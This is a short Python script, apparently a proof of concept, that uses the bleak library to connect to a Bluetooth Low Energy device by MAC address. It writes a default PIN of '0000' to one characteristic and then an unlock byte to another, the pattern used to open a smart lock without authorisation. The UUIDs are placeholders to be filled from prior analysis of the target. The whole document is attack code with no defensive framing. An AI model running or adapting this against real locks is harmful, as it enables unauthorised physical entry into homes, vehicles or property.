import asyncio
from bleak import BleakClient

# Replace with actual MAC and UUIDs from your analysis
target_mac = "11:22:33:44:55:66"
PASSCODE_CHAR_UUID = "0000xxxx-0000-1000-8000-00805f9b34fb"
UNLOCK_CHAR_UUID   = "0000yyyy-0000-1000-8000-00805f9b34fb"

async def unlock():
    async with BleakClient(target_mac) as client:
        if await client.is_connected():
            print("[+] Connected to device.")

            # Step 1: Send passcode (PIN)
            await client.write_gatt_char(PASSCODE_CHAR_UUID, b"0000", response=True)
            print("[+] Passcode written.")

            # Step 2: Send unlock command
            await client.write_gatt_char(UNLOCK_CHAR_UUID, b"\x01", response=True)
            print("[+] Unlock command sent.")
        else:
            print("[-] Failed to connect.")

asyncio.run(unlock())
